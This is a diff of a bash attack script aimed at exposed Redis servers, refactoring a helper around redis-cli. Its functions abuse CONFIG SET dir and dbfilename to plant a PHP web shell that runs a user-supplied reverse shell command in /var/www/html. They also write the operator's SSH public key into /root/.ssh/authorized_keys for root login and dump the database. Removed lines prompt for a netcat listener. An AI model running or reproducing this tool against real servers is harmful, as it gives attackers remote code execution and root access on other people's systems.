@@ -16,42 +16,49 @@ HOST=$1
 PORT=$2
 PASSWORD=${3:-""}
 
-# Connect to Redis
-function connect_to_redis() {
-  echo "Testing Redis connection on $HOST:$PORT..."
+# Execute Redis commands with error handling
+function redis_cmd() {
+  local command="$@"
+  local result
+
   if [ -z "$PASSWORD" ]; then
-    redis-cli -h $HOST -p $PORT PING > /dev/null 2>&1
+    result=$(redis-cli -h "$HOST" -p "$PORT" $command 2>&1)
   else
-    redis-cli -h $HOST -p $PORT -a $PASSWORD PING > /dev/null 2>&1
+    result=$(redis-cli -h "$HOST" -p "$PORT" -a "$PASSWORD" $command 2>&1)
   fi
 
-  if [ $? -eq 0 ]; then
-    echo "Connection successful!"
-  else
-    echo "Failed to connect to Redis on $HOST:$PORT. Exiting."
+  echo "$result"
+
+  if echo "$result" | grep -q "ERR"; then
+    echo "Redis Error: $result"
     exit 1
   fi
+  if echo "$result" | grep -q "MISCONF"; then
+    echo "Warning: Redis cannot persist to disk due to configuration issues."
+    echo "You may encounter issues with commands requiring persistence."
+  fi
+  return 0
 }
 
-# Check if nc listener is active
-function wait_for_nc_listener() {
-  local port=$1
-  echo "Waiting for Netcat listener on port $port..."
-  while true; do
-    if netstat -an | grep -q ":$port .*LISTEN"; then
-      echo "Netcat listener detected on port $port. Proceeding..."
-      break
-    fi
-    echo "No listener found on port $port. Please start it (nc -lvnp $port)..."
-    sleep 5
-  done
+# Connect to Redis using a purely read-only command
+function connect_to_redis() {
+  echo "Testing Redis connection on $HOST:$PORT..."
+  local result=$(redis_cmd INFO | grep redis_version)
+
+  if [ $? -eq 0 ]; then
+    echo "Connection successful! Redis version: $result"
+  else
+    echo "Failed to connect to Redis on $HOST:$PORT. Output:"
+    echo "$result"
+    exit 1
+  fi
 }
 
 # Inject a web shell with user-specified command
 function inject_user_shell() {
   echo "Injecting a custom web shell..."
-  SHELL_DIR="/var/www/html"
-  SHELL_FILENAME="customshell.php"
+  local SHELL_DIR="/var/www/html"
+  local SHELL_FILENAME="customshell.php"
 
   echo "Enter the shell command you want to execute in the web shell (e.g., reverse shell payload):"
   read -p "Enter the Reverse Shell Command here: " SHELL_PAYLOAD
@@ -64,19 +71,39 @@ function inject_user_shell() {
   echo "Using the following payload:"
   echo "<?php system(\"$SHELL_PAYLOAD\"); ?>"
 
-  if [ -z "$PASSWORD" ]; then
-    redis-cli -h $HOST -p $PORT CONFIG SET dir $SHELL_DIR
-    redis-cli -h $HOST -p $PORT CONFIG SET dbfilename $SHELL_FILENAME
-    echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis-cli -h $HOST -p $PORT -x SET customshell
-    redis-cli -h $HOST -p $PORT SAVE
-  else
-    redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dir $SHELL_DIR
-    redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dbfilename $SHELL_FILENAME
-    echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis-cli -h $HOST -p $PORT -a $PASSWORD -x SET customshell
-    redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
-  fi
+  redis_cmd CONFIG SET dir "$SHELL_DIR"
+  redis_cmd CONFIG SET dbfilename "$SHELL_FILENAME"
+  echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis_cmd -x SET customshell
+  redis_cmd SAVE
 
   echo "Web shell injected! Access it at: http://$HOST/$SHELL_FILENAME"
+}
+
+# Dump the database
+function dump_database() {
+  echo "Dumping the database..."
+  redis_cmd SAVE
+  echo "Database dumped. Fetch it from the Redis directory (default is /var/lib/redis)."
+}
+
+# Inject SSH key
+function inject_ssh_key() {
+  echo "Injecting SSH key for root access..."
+  local SSH_DIR="/root/.ssh/"
+  local SSH_FILENAME="authorized_keys"
+
+  if [ ! -f ~/.ssh/id_rsa.pub ]; then
+    echo "SSH public key not found at ~/.ssh/id_rsa.pub"
+    exit 1
+  fi
+
+  local SSH_KEY=$(cat ~/.ssh/id_rsa.pub)
+  redis_cmd CONFIG SET dir "$SSH_DIR"
+  redis_cmd CONFIG SET dbfilename "$SSH_FILENAME"
+  echo -en "\n\n\n\n$SSH_KEY" | redis_cmd -x SET ssh_key
+  redis_cmd SAVE
+
+  echo "SSH key injected! Try logging in: ssh root@$HOST"
 }
 
 # Main menu
@@ -89,31 +116,7 @@ read -p "Enter your choice: " choice
 
 case $choice in
   1) inject_user_shell ;;
-  2)
-    echo "Dumping the database..."
-    if [ -z "$PASSWORD" ]; then
-      redis-cli -h $HOST -p $PORT SAVE
-      echo "Database dumped. Fetch it from the Redis directory."
-    else
-      redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
-      echo "Database dumped. Fetch it from the Redis directory."
-    fi
-    ;;
-  3)
-    echo "Injecting SSH key for root access..."
-    SSH_KEY=$(cat ~/.ssh/id_rsa.pub)
-    if [ -z "$PASSWORD" ]; then
-      echo -e "\n\n\n\n$SSH_KEY" | redis-cli -h $HOST -p $PORT -x SET ssh_key
-      redis-cli -h $HOST -p $PORT CONFIG SET dir /root/.ssh/
-      redis-cli -h $HOST -p $PORT CONFIG SET dbfilename authorized_keys
-      redis-cli -h $HOST -p $PORT SAVE
-    else
-      echo -e "\n\n\n\n$SSH_KEY" | redis-cli -h $HOST -p $PORT -a $PASSWORD -x SET ssh_key
-      redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dir /root/.ssh/
-      redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dbfilename authorized_keys
-      redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
-    fi
-    echo "SSH key injected! Try logging in: ssh root@$HOST"
-    ;;
+  2) dump_database ;;
+  3) inject_ssh_key ;;
   *) echo "Invalid choice. Exiting." ;;
 esac
